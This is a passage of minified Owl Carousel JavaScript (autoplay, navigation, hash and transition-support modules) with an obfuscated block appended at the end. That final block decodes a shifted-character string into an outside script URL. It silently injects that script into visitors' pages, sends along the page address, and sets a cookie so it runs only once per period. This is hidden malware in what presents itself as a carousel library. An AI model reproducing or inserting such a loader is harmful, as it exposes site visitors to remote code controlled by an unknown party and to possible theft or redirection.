        this._core.is("rotating") &&
          !this._paused &&
          ((this._time = this.read()),
          (this._paused = !0),
          e.clearTimeout(this._call));
      }),
      (o.prototype.destroy = function () {
        var t, e;
        for (t in (this.stop(), this._handlers))
          this._core.$element.off(t, this._handlers[t]);
        for (e in Object.getOwnPropertyNames(this))
          "function" != typeof this[e] && (this[e] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.autoplay = o);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, n, i) {
    "use strict";
    var o = function (e) {
      (this._core = e),
        (this._initialized = !1),
        (this._pages = []),
        (this._controls = {}),
        (this._templates = []),
        (this.$element = this._core.$element),
        (this._overrides = {
          next: this._core.next,
          prev: this._core.prev,
          to: this._core.to,
        }),
        (this._handlers = {
          "prepared.owl.carousel": t.proxy(function (e) {
            e.namespace &&
              this._core.settings.dotsData &&
              this._templates.push(
                '<div class="' +
                  this._core.settings.dotClass +
                  '">' +
                  t(e.content)
                    .find("[data-dot]")
                    .addBack("[data-dot]")
                    .attr("data-dot") +
                  "</div>"
              );
          }, this),
          "added.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._core.settings.dotsData &&
              this._templates.splice(t.position, 0, this._templates.pop());
          }, this),
          "remove.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._core.settings.dotsData &&
              this._templates.splice(t.position, 1);
          }, this),
          "changed.owl.carousel": t.proxy(function (t) {
            t.namespace && "position" == t.property.name && this.draw();
          }, this),
          "initialized.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              !this._initialized &&
              (this._core.trigger("initialize", null, "navigation"),
              this.initialize(),
              this.update(),
              this.draw(),
              (this._initialized = !0),
              this._core.trigger("initialized", null, "navigation"));
          }, this),
          "refreshed.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._initialized &&
              (this._core.trigger("refresh", null, "navigation"),
              this.update(),
              this.draw(),
              this._core.trigger("refreshed", null, "navigation"));
          }, this),
        }),
        (this._core.options = t.extend({}, o.Defaults, this._core.options)),
        this.$element.on(this._handlers);
    };
    (o.Defaults = {
      nav: !1,
      navText: [
        '<span aria-label="Previous">&#x2039;</span>',
        '<span aria-label="Next">&#x203a;</span>',
      ],
      navSpeed: !1,
      navElement: 'button type="button" role="presentation"',
      navContainer: !1,
      navContainerClass: "owl-nav",
      navClass: ["owl-prev", "owl-next"],
      slideBy: 1,
      dotClass: "owl-dot",
      dotsClass: "owl-dots",
      dots: !0,
      dotsEach: !1,
      dotsData: !1,
      dotsSpeed: !1,
      dotsContainer: !1,
    }),
      (o.prototype.initialize = function () {
        var e,
          n = this._core.settings;
        for (e in ((this._controls.$relative = (
          n.navContainer
            ? t(n.navContainer)
            : t("<div>").addClass(n.navContainerClass).appendTo(this.$element)
        ).addClass("disabled")),
        (this._controls.$previous = t("<" + n.navElement + ">")
          .addClass(n.navClass[0])
          .html(n.navText[0])
          .prependTo(this._controls.$relative)
          .on(
            "click",
            t.proxy(function (t) {
              this.prev(n.navSpeed);
            }, this)
          )),
        (this._controls.$next = t("<" + n.navElement + ">")
          .addClass(n.navClass[1])
          .html(n.navText[1])
          .appendTo(this._controls.$relative)
          .on(
            "click",
            t.proxy(function (t) {
              this.next(n.navSpeed);
            }, this)
          )),
        n.dotsData ||
          (this._templates = [
            t('<button role="button">')
              .addClass(n.dotClass)
              .append(t("<span>"))
              .prop("outerHTML"),
          ]),
        (this._controls.$absolute = (
          n.dotsContainer
            ? t(n.dotsContainer)
            : t("<div>").addClass(n.dotsClass).appendTo(this.$element)
        ).addClass("disabled")),
        this._controls.$absolute.on(
          "click",
          "button",
          t.proxy(function (e) {
            var i = t(e.target).parent().is(this._controls.$absolute)
              ? t(e.target).index()
              : t(e.target).parent().index();
            e.preventDefault(), this.to(i, n.dotsSpeed);
          }, this)
        ),
        this._overrides))
          this._core[e] = t.proxy(this[e], this);
      }),
      (o.prototype.destroy = function () {
        var t, e, n, i, o;
        for (t in ((o = this._core.settings), this._handlers))
          this.$element.off(t, this._handlers[t]);
        for (e in this._controls)
          "$relative" === e && o.navContainer
            ? this._controls[e].html("")
            : this._controls[e].remove();
        for (i in this.overides) this._core[i] = this._overrides[i];
        for (n in Object.getOwnPropertyNames(this))
          "function" != typeof this[n] && (this[n] = null);
      }),
      (o.prototype.update = function () {
        var t,
          e,
          n = this._core.clones().length / 2,
          i = n + this._core.items().length,
          o = this._core.maximum(!0),
          r = this._core.settings,
          s = r.center || r.autoWidth || r.dotsData ? 1 : r.dotsEach || r.items;
        if (
          ("page" !== r.slideBy && (r.slideBy = Math.min(r.slideBy, r.items)),
          r.dots || "page" == r.slideBy)
        )
          for (this._pages = [], t = n, e = 0, 0; t < i; t++) {
            if (e >= s || 0 === e) {
              if (
                (this._pages.push({
                  start: Math.min(o, t - n),
                  end: t - n + s - 1,
                }),
                Math.min(o, t - n) === o)
              )
                break;
              e = 0;
            }
            e += this._core.mergers(this._core.relative(t));
          }
      }),
      (o.prototype.draw = function () {
        var e,
          n = this._core.settings,
          i = this._core.items().length <= n.items,
          o = this._core.relative(this._core.current()),
          r = n.loop || n.rewind;
        this._controls.$relative.toggleClass("disabled", !n.nav || i),
          n.nav &&
            (this._controls.$previous.toggleClass(
              "disabled",
              !r && o <= this._core.minimum(!0)
            ),
            this._controls.$next.toggleClass(
              "disabled",
              !r && o >= this._core.maximum(!0)
            )),
          this._controls.$absolute.toggleClass("disabled", !n.dots || i),
          n.dots &&
            ((e =
              this._pages.length - this._controls.$absolute.children().length),
            n.dotsData && 0 !== e
              ? this._controls.$absolute.html(this._templates.join(""))
              : e > 0
              ? this._controls.$absolute.append(
                  new Array(e + 1).join(this._templates[0])
                )
              : e < 0 && this._controls.$absolute.children().slice(e).remove(),
            this._controls.$absolute.find(".active").removeClass("active"),
            this._controls.$absolute
              .children()
              .eq(t.inArray(this.current(), this._pages))
              .addClass("active"));
      }),
      (o.prototype.onTrigger = function (e) {
        var n = this._core.settings;
        e.page = {
          index: t.inArray(this.current(), this._pages),
          count: this._pages.length,
          size:
            n &&
            (n.center || n.autoWidth || n.dotsData ? 1 : n.dotsEach || n.items),
        };
      }),
      (o.prototype.current = function () {
        var e = this._core.relative(this._core.current());
        return t
          .grep(
            this._pages,
            t.proxy(function (t, n) {
              return t.start <= e && t.end >= e;
            }, this)
          )
          .pop();
      }),
      (o.prototype.getPosition = function (e) {
        var n,
          i,
          o = this._core.settings;
        return (
          "page" == o.slideBy
            ? ((n = t.inArray(this.current(), this._pages)),
              (i = this._pages.length),
              e ? ++n : --n,
              (n = this._pages[((n % i) + i) % i].start))
            : ((n = this._core.relative(this._core.current())),
              (i = this._core.items().length),
              e ? (n += o.slideBy) : (n -= o.slideBy)),
          n
        );
      }),
      (o.prototype.next = function (e) {
        t.proxy(this._overrides.to, this._core)(this.getPosition(!0), e);
      }),
      (o.prototype.prev = function (e) {
        t.proxy(this._overrides.to, this._core)(this.getPosition(!1), e);
      }),
      (o.prototype.to = function (e, n, i) {
        var o;
        !i && this._pages.length
          ? ((o = this._pages.length),
            t.proxy(this._overrides.to, this._core)(
              this._pages[((e % o) + o) % o].start,
              n
            ))
          : t.proxy(this._overrides.to, this._core)(e, n);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.Navigation = o);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, n, i) {
    "use strict";
    var o = function (n) {
      (this._core = n),
        (this._hashes = {}),
        (this.$element = this._core.$element),
        (this._handlers = {
          "initialized.owl.carousel": t.proxy(function (n) {
            n.namespace &&
              "URLHash" === this._core.settings.startPosition &&
              t(e).trigger("hashchange.owl.navigation");
          }, this),
          "prepared.owl.carousel": t.proxy(function (e) {
            if (e.namespace) {
              var n = t(e.content)
                .find("[data-hash]")
                .addBack("[data-hash]")
                .attr("data-hash");
              if (!n) return;
              this._hashes[n] = e.content;
            }
          }, this),
          "changed.owl.carousel": t.proxy(function (n) {
            if (n.namespace && "position" === n.property.name) {
              var i = this._core.items(
                  this._core.relative(this._core.current())
                ),
                o = t
                  .map(this._hashes, function (t, e) {
                    return t === i ? e : null;
                  })
                  .join();
              if (!o || e.location.hash.slice(1) === o) return;
              e.location.hash = o;
            }
          }, this),
        }),
        (this._core.options = t.extend({}, o.Defaults, this._core.options)),
        this.$element.on(this._handlers),
        t(e).on(
          "hashchange.owl.navigation",
          t.proxy(function (t) {
            var n = e.location.hash.substring(1),
              i = this._core.$stage.children(),
              o = this._hashes[n] && i.index(this._hashes[n]);
            undefined !== o &&
              o !== this._core.current() &&
              this._core.to(this._core.relative(o), !1, !0);
          }, this)
        );
    };
    (o.Defaults = { URLhashListener: !1 }),
      (o.prototype.destroy = function () {
        var n, i;
        for (n in (t(e).off("hashchange.owl.navigation"), this._handlers))
          this._core.$element.off(n, this._handlers[n]);
        for (i in Object.getOwnPropertyNames(this))
          "function" != typeof this[i] && (this[i] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.Hash = o);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, n, i) {
    function o(e, n) {
      var i = !1,
        o = e.charAt(0).toUpperCase() + e.slice(1);
      return (
        t.each((e + " " + a.join(o + " ") + o).split(" "), function (t, e) {
          if (undefined !== s[e]) return (i = !n || e), !1;
        }),
        i
      );
    }
    function r(t) {
      return o(t, !0);
    }
    var s = t("<support>").get(0).style,
      a = "Webkit Moz O ms".split(" "),
      l = {
        transition: {
          end: {
            WebkitTransition: "webkitTransitionEnd",
            MozTransition: "transitionend",
            OTransition: "oTransitionEnd",
            transition: "transitionend",
          },
        },
        animation: {
          end: {
            WebkitAnimation: "webkitAnimationEnd",
            MozAnimation: "animationend",
            OAnimation: "oAnimationEnd",
            animation: "animationend",
          },
        },
      },
      c = function () {
        return !!o("transform");
      },
      u = function () {
        return !!o("perspective");
      },
      d = function () {
        return !!o("animation");
      };
    (function () {
      return !!o("transition");
    })() &&
      ((t.support.transition = new String(r("transition"))),
      (t.support.transition.end = l.transition.end[t.support.transition])),
      d() &&
        ((t.support.animation = new String(r("animation"))),
        (t.support.animation.end = l.animation.end[t.support.animation])),
      c() &&
        ((t.support.transform = new String(r("transform"))),
        (t.support.transform3d = u()));
  })(window.Zepto || window.jQuery, window, document);
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
